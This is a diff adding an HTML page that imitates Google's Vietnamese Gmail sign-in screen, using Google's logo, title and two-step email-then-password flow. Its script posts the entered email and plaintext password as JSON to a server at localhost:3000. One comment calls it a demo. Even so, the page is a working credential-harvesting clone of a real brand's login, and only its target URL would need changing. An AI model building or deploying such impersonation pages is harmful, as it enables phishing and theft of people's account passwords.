@@ -1,0 +1,266 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Đăng nhập - Google</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500;700&display=swap" rel="stylesheet">
+  <style>
+    * { margin:0; padding:0; box-sizing:border-box; }
+    body {
+      font-family: 'Google Sans', Roboto, Arial, sans-serif;
+      background:#fff;
+      min-height:100vh;
+      display:flex;
+      align-items:center;
+      justify-content:center;
+      color:#202124;
+    }
+    .container {
+      display:flex;
+      width:100%;
+      max-width:960px;
+      min-height:560px;
+      box-shadow:0 4px 20px rgba(0,0,0,0.1);
+      border-radius:12px;
+      overflow:hidden;
+    }
+    .illustration-side {
+      flex:1;
+      background:#f8f9fa;
+      padding:60px 48px;
+      display:flex;
+      flex-direction:column;
+      justify-content:center;
+    }
+    .form-side {
+      flex:1;
+      padding:60px 48px 36px;
+    }
+    .login-wrapper { max-width:450px; margin:0 auto; width:100%; }
+    .logo {
+      width:74px;
+      height:24px;
+      background:url('https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png') no-repeat center;
+      background-size:contain;
+      margin:0 auto 48px;
+    }
+    h1 { font-size:28px; font-weight:400; text-align:center; margin-bottom:8px; line-height:36px; }
+    .subtitle { font-size:16px; color:#5f6368; text-align:center; margin-bottom:40px; }
+    input[type="email"], input[type="password"] {
+      width:100%;
+      height:56px;
+      padding:0 16px;
+      font-size:16px;
+      border:1px solid #dadce0;
+      border-radius:4px;
+      outline:none;
+      transition:border-color 0.2s, box-shadow 0.2s;
+    }
+    input:focus {
+      border-color:#1a73e8;
+      box-shadow:0 0 0 2px rgba(26,115,232,0.3);
+    }
+    .password-wrapper { position:relative; margin-bottom:16px; }
+    .toggle-password {
+      position:absolute;
+      right:16px;
+      top:50%;
+      transform:translateY(-50%);
+      cursor:pointer;
+      color:#5f6368;
+      font-size:22px;
+      user-select:none;
+    }
+    .forgot {
+      display:block;
+      color:#1a73e8;
+      font-size:14px;
+      text-decoration:none;
+      margin:24px 0 32px;
+    }
+    .forgot:hover { text-decoration:underline; }
+    .btn-group {
+      display:flex;
+      justify-content:space-between;
+      align-items:center;
+      flex-wrap:wrap;
+      gap:16px;
+    }
+    .create-account { color:#1a73e8; font-size:14px; text-decoration:none; }
+    .create-account:hover { text-decoration:underline; }
+    button {
+      background:#1a73e8;
+      color:white;
+      border:none;
+      border-radius:4px;
+      padding:0 24px;
+      height:48px;
+      font-size:15px;
+      font-weight:500;
+      cursor:pointer;
+      transition:background 0.2s;
+    }
+    button:hover { background:#1765cc; }
+    button:disabled {
+      background:#a5c7f7;
+      cursor:not-allowed;
+    }
+    .step2 { display:none; }
+    .error-msg {
+      color:#d93025;
+      font-size:14px;
+      margin-top:8px;
+      display:none;
+    }
+
+    /* Responsive */
+    @media (max-width:768px) {
+      .container { flex-direction:column; box-shadow:none; border-radius:0; min-height:auto; }
+      .illustration-side { display:none; }
+      .form-side { padding:60px 24px 36px; }
+      button { width:100%; height:52px; font-size:16px; }
+      .btn-group { flex-direction:column-reverse; gap:20px; }
+      .create-account { text-align:center; }
+    }
+  </style>
+</head>
+<body>
+
+<div class="container">
+  <div class="illustration-side">
+    <div class="logo"></div>
+    <h1>Đăng nhập</h1>
+    <div class="subtitle">Tiếp tục đến Gmail</div>
+  </div>
+
+  <div class="form-side">
+    <div class="login-wrapper">
+
+      <!-- Bước 1: Email / SĐT -->
+      <div class="step1">
+        <div class="logo"></div>
+        <h1>Đăng nhập</h1>
+        <div class="subtitle">Sử dụng tài khoản Google của bạn</div>
+
+        <input type="email" id="identifier" placeholder="Email hoặc số điện thoại" autocomplete="username" autofocus />
+
+        <a href="#" class="forgot">Quên email?</a>
+
+        <div class="btn-group">
+          <a href="#" class="create-account">Tạo tài khoản</a>
+          <button id="nextBtn">Tiếp theo</button>
+        </div>
+      </div>
+
+      <!-- Bước 2: Mật khẩu + Gửi request -->
+      <div class="step2">
+        <div class="logo"></div>
+        <h1>Chào mừng trở lại</h1>
+        <div class="subtitle" id="userDisplay"></div>
+
+        <div class="password-wrapper">
+          <input type="password" id="password" placeholder="Mật khẩu" autocomplete="current-password" />
+          <span class="toggle-password" id="togglePass">👁️</span>
+        </div>
+
+        <div class="error-msg" id="errorMsg">Đã có lỗi xảy ra. Vui lòng thử lại.</div>
+
+        <a href="#" class="forgot">Quên mật khẩu?</a>
+
+        <div class="btn-group">
+          <a href="#" class="create-account">Tạo tài khoản</a>
+          <button id="loginBtn">Đăng nhập</button>
+        </div>
+      </div>
+
+    </div>
+  </div>
+</div>
+
+<script>
+  const nextBtn      = document.getElementById('nextBtn');
+  const loginBtn     = document.getElementById('loginBtn');
+  const identifier   = document.getElementById('identifier');
+  const password     = document.getElementById('password');
+  const togglePass   = document.getElementById('togglePass');
+  const userDisplay  = document.getElementById('userDisplay');
+  const errorMsg     = document.getElementById('errorMsg');
+  const step1        = document.querySelector('.step1');
+  const step2        = document.querySelector('.step2');
+
+  // Chuyển bước
+  nextBtn.addEventListener('click', () => {
+    if (!identifier.value.trim()) return alert('Vui lòng nhập email hoặc số điện thoại');
+    userDisplay.textContent = identifier.value;
+    step1.style.display = 'none';
+    step2.style.display = 'block';
+    password.focus();
+  });
+
+  // Toggle mắt mật khẩu
+  togglePass.addEventListener('click', () => {
+    const isPass = password.type === 'password';
+    password.type = isPass ? 'text' : 'password';
+    togglePass.textContent = isPass ? '🙈' : '👁️';
+  });
+
+  // Gửi request khi nhấn Đăng nhập
+  loginBtn.addEventListener('click', async () => {
+    const email = identifier.value.trim();
+    const pass  = password.value.trim();
+
+    if (!pass) {
+      alert('Vui lòng nhập mật khẩu');
+      return;
+    }
+
+    // Vô hiệu hóa nút trong lúc gửi
+    loginBtn.disabled = true;
+    loginBtn.textContent = 'Đang đăng nhập...';
+    errorMsg.style.display = 'none';
+
+    try {
+      const response = await fetch('http://localhost:3000/login', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({
+          email: email,
+          password: pass,          // chỉ để demo – thực tế KHÔNG nên gửi password plaintext
+        }),
+      });
+
+      if (!response.ok) {
+        throw new Error(`HTTP error! status: ${response.status}`);
+      }
+
+      const data = await response.json();
+
+      // Giả sử server trả về { "message": "hello world" }
+      if (data.message) {
+        alert(data.message);  // → "hello world"
+      } else {
+        alert('Đăng nhập thành công! (Server trả về: ' + JSON.stringify(data) + ')');
+      }
+
+    } catch (err) {
+      console.error('Lỗi khi gửi request:', err);
+      errorMsg.style.display = 'block';
+      alert('Không kết nối được đến server localhost. Kiểm tra server có đang chạy không?');
+    } finally {
+      loginBtn.disabled = false;
+      loginBtn.textContent = 'Đăng nhập';
+    }
+  });
+
+  // Enter phím
+  identifier.addEventListener('keypress', e => { if (e.key === 'Enter') nextBtn.click(); });
+  password.addEventListener('keypress', e => { if (e.key === 'Enter') loginBtn.click(); });
+</script>
+
+</body>
+</html>
